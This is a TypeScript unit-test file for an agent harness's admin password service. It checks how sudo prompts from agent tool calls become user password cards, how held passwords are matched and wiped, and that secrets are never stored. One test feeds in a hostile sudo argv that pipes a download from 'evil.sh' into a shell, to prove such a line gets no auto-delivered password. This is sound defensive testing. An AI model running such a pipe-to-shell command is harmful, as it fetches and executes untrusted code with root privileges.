import { describe, it, expect, vi } from 'vitest';
import { EventEmitter } from 'events';
import { AdminPasswordService } from '../src/main/harness/admin-password-service';
import type { PasswordAskRequest } from '../src/main/harness/permission-broker';
import type { AskpassAskEvent } from '../src/main/harness/askpass/askpass-server';

// A minimal but REAL re-implementation of the two slices of the broker's and
// AskpassServer's behavior this service depends on — not a bag of vi.fn()s —
// so the ordering tests below (submit() forgetting its mapping BEFORE
// withdraw() fires PasswordResolved, etc.) exercise the actual event loop
// this service relies on, not a mock that can't loop back.
class FakeBroker extends EventEmitter {
  calls: PasswordAskRequest[] = [];
  private counter = 0;
  lastRequestId = '';
  askPassword(req: PasswordAskRequest): string {
    this.calls.push(req);
    const id = `native-pw-${++this.counter}`;
    this.lastRequestId = id;
    return id;
  }
  withdraw(id: string): boolean {
    this.emit('hook-event', { type: 'PasswordResolved', sessionId: 's', payload: { _requestId: id } });
    return true;
  }
}

class FakeAskpass extends EventEmitter {
  delivered: Array<{ askId: string; password: Buffer }> = [];
  refused: string[] = [];
  deliverResult = true;
  deliver(askId: string, password: Buffer): boolean {
    this.delivered.push({ askId, password });
    return this.deliverResult;
  }
  refuse(askId: string): boolean {
    this.refused.push(askId);
    return true;
  }
}

function askEvent(overrides: Partial<AskpassAskEvent> = {}): AskpassAskEvent {
  return {
    askId: 'ask-1',
    sudoPid: 111,
    sudoArgv: ['sudo', 'apt', 'update'],
    sudoExePath: '/usr/bin/sudo',
    callRoot: 1,
    toolCallId: 'bash-1',
    sessionId: 's1',
    attempt: 0,
    ...overrides,
  };
}

describe('AdminPasswordService — turning a verified askpass connection into a PasswordRequest', () => {
  it('registers a broker password ask built from the sudo argv, with no specialist label for a plain session', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    new AdminPasswordService({ broker, askpass });

    askpass.emit('ask', askEvent());

    expect(broker.calls).toHaveLength(1);
    expect(broker.calls[0]).toMatchObject({
      sessionId: 's1',
      toolUseId: 'bash-1',
      command: 'apt update', // sudo + no flags stripped
      triesLeft: undefined,
      specialist: undefined,
      raisedBy: undefined,
    });
  });

  it('threads `via` through from the ask event', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    new AdminPasswordService({ broker, askpass });
    askpass.emit('ask', askEvent({ via: 'install.sh' }));
    expect(broker.calls[0].via).toBe('install.sh');
  });

  // Design §6: "attempt 0 -> undefined; n -> 3-n".
  it.each([
    [0, undefined],
    [1, 2],
    [2, 1],
    [3, 0],
  ])('maps attempt %d to triesLeft %s', (attempt, expected) => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    new AdminPasswordService({ broker, askpass });
    askpass.emit('ask', askEvent({ attempt }));
    expect(broker.calls[0].triesLeft).toBe(expected);
  });

  it('routes a specialist child\'s own sudo to the PARENT session, labelled like childAskRouter', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const resolveSpecialistChild = (sessionId: string) =>
      sessionId === 'child-session-1'
        ? { parentId: 'parent-1', childId: 'child-1', agentType: 'worker', title: 'Wren the Worker', parentToolCallId: 'task-1' }
        : null;
    new AdminPasswordService({ broker, askpass, resolveSpecialistChild });

    askpass.emit('ask', askEvent({ sessionId: 'child-session-1' }));

    expect(broker.calls[0]).toMatchObject({
      sessionId: 'parent-1',
      raisedBy: 'child-1',
      specialist: { childId: 'child-1', agentType: 'worker', title: 'Wren the Worker', parentToolCallId: 'task-1' },
    });
  });

  it('leaves the ask on its own session when resolveSpecialistChild finds nothing', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    new AdminPasswordService({ broker, askpass, resolveSpecialistChild: () => null });
    askpass.emit('ask', askEvent());
    expect(broker.calls[0].sessionId).toBe('s1');
    expect(broker.calls[0].specialist).toBeUndefined();
  });
});

describe('AdminPasswordService.submit — the one place `password` is converted to a Buffer', () => {
  it('delivers a Buffer built from the password to the right askpass connection, then withdraws the broker ask', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const service = new AdminPasswordService({ broker, askpass });
    askpass.emit('ask', askEvent());

    const ok = service.submit(broker.lastRequestId, 'sekrit');

    expect(ok).toBe(true);
    expect(askpass.delivered).toHaveLength(1);
    expect(askpass.delivered[0].askId).toBe('ask-1');
    expect(askpass.delivered[0].password).toBeInstanceOf(Buffer);
    expect(askpass.delivered[0].password.toString('utf8')).toBe('sekrit');
    // The mapping is forgotten and the broker ask withdrawn either way — every
    // OTHER device watching this session needs its card to end too.
    expect(askpass.refused).toEqual([]); // NOT refused — it was delivered, not refused
  });

  it('returns false for an unknown requestId, and touches neither askpass nor the broker', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const service = new AdminPasswordService({ broker, askpass });
    expect(service.submit('nope', 'x')).toBe(false);
    expect(askpass.delivered).toEqual([]);
  });

  it('returns false when the askpass connection is already gone (deliver refuses), but still withdraws the broker ask', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    askpass.deliverResult = false;
    const service = new AdminPasswordService({ broker, askpass });
    askpass.emit('ask', askEvent());
    const ok = service.submit(broker.lastRequestId, 'sekrit');
    expect(ok).toBe(false);
    expect(askpass.delivered).toHaveLength(1); // still attempted
  });

  it('does not deliver twice for the same requestId (a repeat submit is an unknown-id no-op)', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const service = new AdminPasswordService({ broker, askpass });
    askpass.emit('ask', askEvent());
    const requestId = broker.lastRequestId;
    expect(service.submit(requestId, 'first')).toBe(true);
    expect(service.submit(requestId, 'second')).toBe(false);
    expect(askpass.delivered).toHaveLength(1);
    expect(askpass.delivered[0].password.toString('utf8')).toBe('first');
  });

  it('never logs or stores the password anywhere reachable after the call returns', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const service = new AdminPasswordService({ broker, askpass });
    askpass.emit('ask', askEvent());
    service.submit(broker.lastRequestId, 'the-actual-secret');
    // The service itself holds no field containing the string anywhere.
    for (const value of Object.values(service as unknown as Record<string, unknown>)) {
      if (typeof value === 'function') continue; // JSON.stringify(fn) is undefined, not "absent"
      expect(JSON.stringify(value) ?? '').not.toContain('the-actual-secret');
    }
  });
});

describe('AdminPasswordService — the socket side (withdrawn) and the broker side (PasswordResolved)', () => {
  it('a socket closing (withdrawn) tells the broker to withdraw the matching ask', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    let withdrawnCalledWith: string | null = null;
    const originalWithdraw = broker.withdraw.bind(broker);
    broker.withdraw = (id: string) => { withdrawnCalledWith = id; return originalWithdraw(id); };
    new AdminPasswordService({ broker, askpass });
    askpass.emit('ask', askEvent());
    const requestId = broker.lastRequestId;

    askpass.emit('withdrawn', 'ask-1');

    expect(withdrawnCalledWith).toBe(requestId);
  });

  it('a repeat withdrawn for the same askId is a no-op (the mapping is already gone)', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    let withdrawCount = 0;
    const originalWithdraw = broker.withdraw.bind(broker);
    broker.withdraw = (id: string) => { withdrawCount++; return originalWithdraw(id); };
    new AdminPasswordService({ broker, askpass });
    askpass.emit('ask', askEvent());
    askpass.emit('withdrawn', 'ask-1');
    askpass.emit('withdrawn', 'ask-1');
    expect(withdrawCount).toBe(1);
  });

  it('a withdrawn askId this service never registered is a no-op', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    new AdminPasswordService({ broker, askpass });
    expect(() => askpass.emit('withdrawn', 'never-heard-of-it')).not.toThrow();
    expect(broker.calls).toEqual([]);
  });

  it("the broker's own PasswordResolved (session Stop/Skip/close/quit) refuses the still-open askpass socket", () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    new AdminPasswordService({ broker, askpass });
    askpass.emit('ask', askEvent());
    const requestId = broker.lastRequestId;

    // Simulates PermissionBroker.cancelSession/cancelAll — a removal path
    // that does NOT go through this service's own withdraw() call.
    broker.emit('hook-event', { type: 'PasswordResolved', sessionId: 's1', payload: { _requestId: requestId } });

    expect(askpass.refused).toEqual(['ask-1']);
  });

  it("submit()'s own withdraw() does NOT also trigger a refuse (the mapping is forgotten first)", () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const service = new AdminPasswordService({ broker, askpass });
    askpass.emit('ask', askEvent());
    service.submit(broker.lastRequestId, 'sekrit');
    // withdraw() inside submit() emits PasswordResolved synchronously — if the
    // mapping were still present, this would incorrectly refuse the socket
    // this call JUST delivered a password to.
    expect(askpass.refused).toEqual([]);
  });

  it('a PasswordResolved for an unknown/already-forgotten requestId is a no-op', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    new AdminPasswordService({ broker, askpass });
    expect(() => broker.emit('hook-event', { type: 'PasswordResolved', sessionId: 's1', payload: { _requestId: 'never-asked' } })).not.toThrow();
    expect(askpass.refused).toEqual([]);
  });

  it('ignores every other hook-event type (e.g. PermissionResolved) on the broker', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    new AdminPasswordService({ broker, askpass });
    askpass.emit('ask', askEvent());
    broker.emit('hook-event', { type: 'PermissionResolved', sessionId: 's1', payload: { _requestId: broker.lastRequestId } });
    expect(askpass.refused).toEqual([]);
  });
});

// admin-password design §2.4/R20/§11 task 5: the up-front flow.
describe('AdminPasswordService.askUpFront — R20, held before any askpass connection exists', () => {
  it('registers a broker password ask with the FIRST visible sudo line, no via', async () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const service = new AdminPasswordService({ broker, askpass });
    void service.askUpFront({ sessionId: 's1', toolCallId: 'bash-1', expectedArgvLines: [['apt', 'update']] });
    expect(broker.calls).toHaveLength(1);
    expect(broker.calls[0]).toMatchObject({ sessionId: 's1', toolUseId: 'bash-1', command: 'apt update' });
    expect(broker.calls[0].via).toBeUndefined();
  });

  it('resolves "submitted" on submit(), and the password is HELD — never delivered to askpass directly', async () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const service = new AdminPasswordService({ broker, askpass });
    const p = service.askUpFront({ sessionId: 's1', toolCallId: 'bash-1', expectedArgvLines: [['apt', 'update']] });
    const ok = service.submit(broker.lastRequestId, 'sekrit');
    expect(ok).toBe(true);
    expect(await p).toBe('submitted');
    expect(askpass.delivered).toEqual([]); // held, not delivered — no askpass connection exists yet
  });

  it('a Skip/Stop/session-close cancellation resolves "canceled" (the SAME broker.cancelSession path a permission ask uses)', async () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const service = new AdminPasswordService({ broker, askpass });
    const p = service.askUpFront({ sessionId: 's1', toolCallId: 'bash-1', expectedArgvLines: [['apt', 'update']] });
    // Simulates PermissionBroker.cancelSession/cancelAll.
    broker.emit('hook-event', { type: 'PasswordResolved', sessionId: 's1', payload: { _requestId: broker.lastRequestId } });
    expect(await p).toBe('canceled');
  });

  it('a matching later askpass connection gets the held password with NO card', async () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const service = new AdminPasswordService({ broker, askpass });
    const p = service.askUpFront({ sessionId: 's1', toolCallId: 'bash-1', expectedArgvLines: [['apt', 'update']] });
    service.submit(broker.lastRequestId, 'sekrit');
    expect(await p).toBe('submitted');
    const callsBefore = broker.calls.length;

    askpass.emit('ask', askEvent({ askId: 'ask-real', sudoArgv: ['sudo', 'apt', 'update'] }));

    expect(askpass.delivered).toHaveLength(1);
    expect(askpass.delivered[0].askId).toBe('ask-real');
    expect(askpass.delivered[0].password.toString('utf8')).toBe('sekrit');
    expect(broker.calls.length).toBe(callsBefore); // no NEW card was raised
  });

  it('a NON-matching sudo elsewhere in the same call gets the ordinary card instead, leaving the hold intact', async () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const service = new AdminPasswordService({ broker, askpass });
    const p = service.askUpFront({ sessionId: 's1', toolCallId: 'bash-1', expectedArgvLines: [['apt', 'update']] });
    service.submit(broker.lastRequestId, 'sekrit');
    await p;

    askpass.emit('ask', askEvent({ askId: 'ask-hidden', sudoArgv: ['sudo', 'curl', 'evil.sh', '|', 'sh'] }));

    expect(askpass.delivered).toEqual([]); // NOT auto-delivered
    expect(broker.calls).toHaveLength(2);   // the up-front ask, then this ordinary one

    // The hold survives — a LATER matching ask still gets it silently.
    askpass.emit('ask', askEvent({ askId: 'ask-real', sudoArgv: ['sudo', 'apt', 'update'] }));
    expect(askpass.delivered).toHaveLength(1);
    expect(askpass.delivered[0].askId).toBe('ask-real');
  });

  it('the held password is used at most once, even against a repeated matching argv', async () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const service = new AdminPasswordService({ broker, askpass });
    const p = service.askUpFront({ sessionId: 's1', toolCallId: 'bash-1', expectedArgvLines: [['apt', 'update']] });
    service.submit(broker.lastRequestId, 'sekrit');
    await p;

    askpass.emit('ask', askEvent({ askId: 'ask-1', sudoArgv: ['sudo', 'apt', 'update'] }));
    expect(askpass.delivered).toHaveLength(1);

    // A SECOND ask matching the same line no longer has anything held —
    // falls to the ordinary card.
    askpass.emit('ask', askEvent({ askId: 'ask-2', sudoArgv: ['sudo', 'apt', 'update'] }));
    expect(askpass.delivered).toHaveLength(1); // unchanged
    expect(broker.calls).toHaveLength(2);       // the up-front ask + this new card
  });
});

// admin-password design section 6.
describe('AdminPasswordService.wipeUpfront — dropping an unconsumed held password', () => {
  it('zeroes and drops a held password that was never consumed', async () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const service = new AdminPasswordService({ broker, askpass });
    const p = service.askUpFront({ sessionId: 's1', toolCallId: 'bash-1', expectedArgvLines: [['apt', 'update']] });
    service.submit(broker.lastRequestId, 'sekrit');
    await p;

    service.wipeUpfront('bash-1');

    // Nothing left to hand out — a later ask that would have matched now
    // falls straight through to the ordinary card.
    askpass.emit('ask', askEvent({ sudoArgv: ['sudo', 'apt', 'update'] }));
    expect(askpass.delivered).toEqual([]);
  });

  it('is a cheap no-op when nothing is held for that toolCallId', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const service = new AdminPasswordService({ broker, askpass });
    expect(() => service.wipeUpfront('never-asked')).not.toThrow();
  });
});

// admin-password design sections 5 and 7.
describe('AdminPasswordService — RunningCalls wiring', () => {
  it('markGranted + recordSudoPath fire on a mid-command delivery', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const runningCalls = { markGranted: vi.fn(), recordSudoPath: vi.fn() };
    const service = new AdminPasswordService({ broker, askpass, runningCalls });
    askpass.emit('ask', askEvent({ sudoExePath: '/usr/bin/sudo' }));
    service.submit(broker.lastRequestId, 'sekrit');
    expect(runningCalls.markGranted).toHaveBeenCalledWith('bash-1');
    expect(runningCalls.recordSudoPath).toHaveBeenCalledWith('/usr/bin/sudo');
  });

  it('markGranted + recordSudoPath fire on an up-front-matched delivery too', async () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const runningCalls = { markGranted: vi.fn(), recordSudoPath: vi.fn() };
    const service = new AdminPasswordService({ broker, askpass, runningCalls });
    const p = service.askUpFront({ sessionId: 's1', toolCallId: 'bash-1', expectedArgvLines: [['apt', 'update']] });
    service.submit(broker.lastRequestId, 'sekrit');
    await p;
    askpass.emit('ask', askEvent({ sudoArgv: ['sudo', 'apt', 'update'], sudoExePath: '/usr/bin/sudo' }));
    expect(runningCalls.markGranted).toHaveBeenCalledWith('bash-1');
    expect(runningCalls.recordSudoPath).toHaveBeenCalledWith('/usr/bin/sudo');
  });

  it('does not throw when no runningCalls dep is injected (task 4\'s existing default)', () => {
    const broker = new FakeBroker();
    const askpass = new FakeAskpass();
    const service = new AdminPasswordService({ broker, askpass });
    askpass.emit('ask', askEvent());
    expect(() => service.submit(broker.lastRequestId, 'sekrit')).not.toThrow();
  });
});

// admin-password design section 7 — feeds ShellRegistry.admin.
describe('AdminPasswordService — the "accepted" signal', () => {
  it('emits "accepted" ~1s after a delivery with no re-ask for the same sudo pid', () => {
    vi.useFakeTimers();
    try {
      const broker = new FakeBroker();
      const askpass = new FakeAskpass();
      const service = new AdminPasswordService({ broker, askpass });
      const accepted = vi.fn();
      service.on('accepted', accepted);
      askpass.emit('ask', askEvent({ sudoPid: 999 }));
      service.submit(broker.lastRequestId, 'sekrit');
      expect(accepted).not.toHaveBeenCalled();
      vi.advanceTimersByTime(1_000);
      expect(accepted).toHaveBeenCalledWith({ sessionId: 's1', toolCallId: 'bash-1' });
    } finally {
      vi.useRealTimers();
    }
  });

  it('a re-ask for the SAME sudo pid (the previous password was wrong) cancels the pending "accepted" signal', () => {
    vi.useFakeTimers();
    try {
      const broker = new FakeBroker();
      const askpass = new FakeAskpass();
      const service = new AdminPasswordService({ broker, askpass });
      const accepted = vi.fn();
      service.on('accepted', accepted);
      askpass.emit('ask', askEvent({ sudoPid: 999, attempt: 0 }));
      service.submit(broker.lastRequestId, 'wrong');
      // sudo asks again on the SAME pid before the 1s window elapses.
      vi.advanceTimersByTime(500);
      askpass.emit('ask', askEvent({ sudoPid: 999, attempt: 1, askId: 'ask-2' }));
      vi.advanceTimersByTime(1_000);
      expect(accepted).not.toHaveBeenCalled();
    } finally {
      vi.useRealTimers();
    }
  });
});
